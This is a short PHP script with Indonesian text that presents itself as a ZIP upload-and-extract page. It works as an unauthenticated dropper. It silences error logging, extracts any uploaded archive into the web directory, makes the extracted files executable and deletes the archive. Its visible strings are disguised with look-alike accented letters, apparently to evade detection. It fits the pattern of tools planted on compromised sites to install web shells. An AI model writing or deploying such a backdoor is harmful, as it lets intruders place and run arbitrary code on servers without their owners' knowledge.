<?php
@set_time_limit(0);
@clearstatcache();
error_reporting(0);
@ini_set('error_log', null);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('display_errors', 0);
@ini_set('display_startup_errors', '0');
@ini_set('output_buffering', 'off');
@ini_set('zlib.output_compression', 0);
@ini_set('implicit_flush', 1);

for ($j = 0; $j < 3; $j++) {
    echo str_repeat(' ', 1024);
    @flush();
    @ob_flush();
}

if (!class_exists('ZipArchive')) {
    die("ZipArchive tidak tersedia. Pastikan zip diaktifkan di PHP.");
}

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES["zipfile"])) {
    $uploadedFile = $_FILES["zipfile"]["tmp_name"];
    $fileName     = $_FILES["zipfile"]["name"];
    $targetFile   = $fileName;

    if (move_uploaded_file($uploadedFile, $targetFile)) {
        $zip = new ZipArchive;
        if ($zip->open($targetFile) === TRUE) {
            $extractTo = "./";

            $zip->extractTo($extractTo);

            $files = [];
            for ($i = 0; $i < $zip->numFiles; $i++) {
                $files[] = $zip->getNameIndex($i);
            }

            $zip->close();

            foreach ($files as $file) {
                $filePath = $extractTo . $file;
                if (file_exists($filePath)) {
                    @chmod($filePath, 0755);
                }
            }

            if (file_exists($targetFile)) {
                @unlink($targetFile);
            }

            echo "<h3>Fĩļệ ZĨP berhasil diekstrak</h3>";
            echo "Semua file telah diekstrak ke folder yang sama dengan Fĩļệ ZĨP.";
        } else {
            echo "Gagal membuka Fĩļệ ZĨP.";
        }
    } else {
        echo "Gagal mengunggah file.";
    }
} else {
    echo '
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Unzip Fĩļệ ZĨP</title>
    </head>
    <body>
        <h2>Unggah Fĩļệ ZĨP untuk Diekstrak</h2>
        <form action="" method="post" enctype="multipart/form-data">
            <label for="zipfile">Pilih Fĩļệ ZĨP:</label>
            <input type="file" name="zipfile" id="zipfile" required><br><br>
            <input type="submit" value="Unggah dan Ekstrak">
        </form>
    </body>
    </html>';
}
?>
